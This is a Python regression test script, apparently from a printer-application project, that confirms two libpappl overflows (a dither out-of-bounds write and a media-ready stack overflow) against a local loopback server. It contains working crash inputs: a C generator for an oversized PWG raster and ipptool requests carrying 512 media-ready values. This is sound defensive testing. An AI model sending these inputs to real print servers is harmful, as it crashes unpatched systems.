#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-only
"""Check the two libpappl overflows against the libpappl that actually runs.

These are S-1 and S-2 in docs/SECURITY-REVIEW.md: an out-of-bounds write while
libpappl dithers an 8-bit raster wider than the page, and a stack overflow when
a client sends more media-ready values than PAPPL_MAX_SOURCE. Neither has a fix
this project can make, in either direction: the dependency decides.

Upstream fixed both in 1.4.12 (its CHANGES.md lists them as the two
"CVE-2026-NNNNN" overflow-protection entries), and this tree supports both that
release and the 1.3.1 Debian ships, so the expectation depends on the version:

* below 1.4.12 each case must still kill the server, and a survivor means
  libpappl was patched — the signal to retire the matching row in the review;
* from 1.4.12 each case must leave the server running, and a crash means the
  fix did not cover this input, which is a new finding rather than a known one.

The version is read from the running server's own `Server:` header, which
libpappl fills in as "<app>/<version> PAPPL/<version> CUPS IPP/2.0". That is
the only runtime version accessor the library has, and asking the library that
serves the request is the whole point: every 1.x has soname libpappl.so.1, so a
binary compiled against one release can silently run against another, and
pkg-config would describe the headers rather than the library under test.

Everything is loopback and scoped to a temporary directory: XDG_CONFIG_HOME and
TMPDIR point into it, so the developer's own PAPPL state is never touched.

Requires: cargo build -p ml216x-printer-app, cc, libcups2-dev, ipptool.
"""
import argparse
import http.client
import os
import re
import socket
import subprocess
import sys
import tempfile
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
APP = ROOT / "target/debug/ml216x-printer-app"

# The release that carries both fixes: PAPPL 1.4.12, 2026-08-20.
FIXED_IN = (1, 4, 12)

# S-1's generator, inlined so the script is self-contained. It writes an 8-bit
# grayscale PWG raster whose width is overridden to something wider than any
# page, which is exactly the geometry libpappl's dither loop fails to bound.
WIDE_GRAY_C = r"""
#include <cups/raster.h>
#include <cups/pwg.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
int main(int argc, char **argv) {
  if (argc != 4) return 2;
  unsigned width = (unsigned)atoi(argv[2]), height = (unsigned)atoi(argv[3]);
  cups_page_header2_t h;
  memset(&h, 0, sizeof(h));
  pwg_media_t *media = pwgMediaForPWG("iso_a4_210x297mm");
  if (!media || !cupsRasterInitPWGHeader(&h, media, "sgray_8", 600, 600, "one-sided", "normal"))
    return 3;
  h.cupsWidth = width;
  h.cupsHeight = height;
  h.cupsBytesPerLine = width;
  int fd = open(argv[1], O_WRONLY | O_CREAT | O_TRUNC, 0600);
  if (fd < 0) return 4;
  cups_raster_t *r = cupsRasterOpen(fd, CUPS_RASTER_WRITE_PWG);
  if (!r || !cupsRasterWriteHeader2(r, &h)) return 5;
  unsigned char *line = malloc(h.cupsBytesPerLine);
  if (!line) return 6;
  memset(line, 0x80, h.cupsBytesPerLine);
  for (unsigned y = 0; y < h.cupsHeight; y++)
    if (cupsRasterWritePixels(r, line, h.cupsBytesPerLine) != h.cupsBytesPerLine) return 7;
  free(line); cupsRasterClose(r); close(fd);
  return 0;
}
"""

MEDIA = ["iso_a4_210x297mm", "na_letter_8.5x11in", "iso_a5_148x210mm", "iso_a6_105x148mm"]


def wait_for_port(port):
    for _ in range(200):
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=.1):
                return True
        except OSError:
            time.sleep(.05)
    return False


def pappl_version(port):
    """The libpappl the running server loaded, as a (major, minor, patch) tuple.

    Read from its own Server: header, which pappl/system.c builds as
    "<app>/<version> PAPPL/<version> CUPS IPP/2.0". An unreadable header stops
    the run: guessing the version would decide the expectation below, and a
    guessed expectation is worse than no check at all.
    """
    connection = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
    try:
        connection.request("GET", "/")
        header = connection.getresponse().getheader("Server") or ""
    finally:
        connection.close()
    found = re.search(r"PAPPL/(\d+)\.(\d+)\.(\d+)", header)
    if not found:
        raise SystemExit(f"no PAPPL version in the server's Server: header {header!r}")
    return tuple(int(part) for part in found.groups())


def start_server(tmp, env, port):
    log = (tmp / "server.log").open("w+")
    server = subprocess.Popen(
        [str(APP), "--probe-output", str(tmp / "out.spl"), "--listen-port", str(port),
         "--spool-directory", str(tmp / "spool"), "server"],
        stdout=log, stderr=log, env=env)
    if not wait_for_port(port):
        raise SystemExit("server did not start")
    return server, log


def dither_input(tmp, env):
    source = tmp / "wide-gray.c"
    source.write_text(WIDE_GRAY_C)
    generator = tmp / "wide-gray"
    subprocess.run(["cc", "-Wall", "-Wextra", "-Werror", source, "-lcups", "-o", generator],
                   check=True, env=env)
    raster = tmp / "wide.pwg"
    subprocess.run([generator, raster, "40000", "64"], check=True, env=env)
    return f'''{{
NAME "S-1 wide 8-bit grayscale"
OPERATION Print-Job
GROUP operation-attributes-tag
ATTR charset attributes-charset utf-8
ATTR naturalLanguage attributes-natural-language en
ATTR uri printer-uri $uri
ATTR name requesting-user-name tester
ATTR mimeMediaType document-format image/pwg-raster
FILE {raster}
}}
'''


def ready_media_input(tmp, env):
    values = ",".join(MEDIA[i % len(MEDIA)] for i in range(512))
    return f'''{{
NAME "S-2 oversized media-ready"
OPERATION Set-Printer-Attributes
GROUP operation-attributes-tag
ATTR charset attributes-charset utf-8
ATTR naturalLanguage attributes-natural-language en
ATTR uri printer-uri $uri
ATTR name requesting-user-name tester
GROUP printer-attributes-tag
ATTR keyword media-ready {values}
}}
'''


CASES = {"dither": dither_input, "ready-media": ready_media_input}


def run_case(name, port):
    if not APP.exists():
        raise SystemExit("build first: cargo build -p ml216x-printer-app")
    with tempfile.TemporaryDirectory(prefix=f"ml216x-sec-{name}-") as temp:
        tmp = Path(temp)
        env = dict(os.environ, XDG_CONFIG_HOME=str(tmp), TMPDIR=str(tmp))
        server, log = start_server(tmp, env, port)
        try:
            version = pappl_version(port)
            test = tmp / "case.test"
            test.write_text(CASES[name](tmp, env))
            subprocess.run(
                ["ipptool", "-t", f"ipp://127.0.0.1:{port}/ipp/print/probe", str(test)],
                capture_output=True, text=True, env=env, timeout=60)
            time.sleep(2)
            code = server.poll()
        finally:
            if server.poll() is None:
                server.terminate()
                try:
                    server.wait(timeout=10)
                except subprocess.TimeoutExpired:
                    server.kill()
        crashed = code is not None and code < 0
        shown = ".".join(str(part) for part in version)
        fixed = ".".join(str(part) for part in FIXED_IN)
        if version < FIXED_IN:
            if crashed:
                print(f"PASS {name}: PAPPL {shown} was killed by signal {-code}, "
                      f"reproducing the overflow")
                return True
            print(f"FAIL {name}: PAPPL {shown} did not crash (exit {code}); "
                  f"it may have been patched — check and retire this finding")
        else:
            if not crashed:
                print(f"PASS {name}: PAPPL {shown} survived the input; "
                      f"fixed upstream in {fixed}")
                return True
            print(f"FAIL {name}: PAPPL {shown} was killed by signal {-code} "
                  f"even though this was fixed in {fixed}; this is a new "
                  f"finding, not S-1 or S-2")
        log.seek(0)
        print("\n".join(log.read().splitlines()[-6:]))
        return False


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--case", choices=[*CASES, "all"], default="all")
    parser.add_argument("--port", type=int, default=8633)
    args = parser.parse_args()
    cases = list(CASES) if args.case == "all" else [args.case]
    ok = True
    for offset, name in enumerate(cases):
        ok = run_case(name, args.port + offset) and ok
    sys.exit(0 if ok else 1)


main()
